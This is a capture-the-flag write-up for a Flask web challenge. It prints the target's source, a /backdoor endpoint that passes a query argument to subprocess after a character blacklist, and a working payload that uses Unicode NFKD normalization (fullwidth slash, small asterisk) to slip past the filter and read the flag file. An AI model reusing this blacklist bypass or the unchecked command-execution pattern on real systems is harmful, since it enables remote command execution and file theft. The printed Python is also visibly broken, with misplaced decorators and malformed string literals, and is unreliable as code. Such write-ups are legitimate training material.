# can-you-bypass:Web

Flag Proof: `CTF{8e6c5056d1504b3d82e61255439af9ac9a35634b11849644a70b9a498ea88d28}`

## Summary:

- Going to the page we can see the source code of the application written in Flask
- From the source code we understand that:
    - There is a `backdoor` endpoint which takes a `cmd` argument and executes it
    - There is a big blacklist on the characters we can execute in out command
    - Our command will be `normalized` and then executed (this is the part that we can use to bypass the blacklist)
    - This was quite straightforward for me as there is a htb machine for this particular vulnerability named: unicode which has been retired yesterday

```python
from flask import Flask, abort, request 
import unicodedata
import subprocess 
app = Flask(__name__) 
def waf(input): 
	blacklist = ["~","!","@","#","$","%","^","&","*","(",")","_","_","+","=","{","}","]","[","|","\",",".","/","?",";",":",""",""","<",">"] 
	vuln_detected = False 
	if any(string in input for string in blacklist): 
		vuln_detected = True 
		return vuln_detected 
		@app.route('/') 

def index(): 
	with open('app.py', 'r') as f: 
		output = f.read() 
		return output 
	@app.route('/backdoor') 

def backdoor(): 
	cmd = request.args.get('cmd') 
	data="" 
	if waf(cmd): 
		abort(403, description="Exploit Detected") 
	else: 
		well = unicodedata.normalize('NFKD', cmd) 
		data = subprocess.getoutput(well) 
		return data 

if __name__ == '__main__': 
	app.run(host='0.0.0.0', port=5000, debug=True, threaded=True, use_evalex=False)
```

- Using these sites
    - [https://www.compart.com/en/unicode/U+FE61](https://www.compart.com/en/unicode/U+FE61)
    - [https://book.hacktricks.xyz/pentesting-web/unicode-normalization-vulnerability](https://book.hacktricks.xyz/pentesting-web/unicode-normalization-vulnerability)
- For some reason my relative path payload didn’t work, and i have done using the absolut one using  `/` and getting the path with `pwd`

![Untitled](can-you-bypass%20Web%2038b264252d3a4e78bafa54fa32b7d2a2/Untitled.png)

- I made my payload with:
    - `/` as `%ef%bc%8f`
    - `*`  as `﹡` (**U+FE61)**
- Payload:
    - `cat %ef%bc%8fhome%ef%bc%8fctf%ef%bc%8fflag﹡`
    
    ![Untitled](can-you-bypass%20Web%2038b264252d3a4e78bafa54fa32b7d2a2/Untitled%201.png)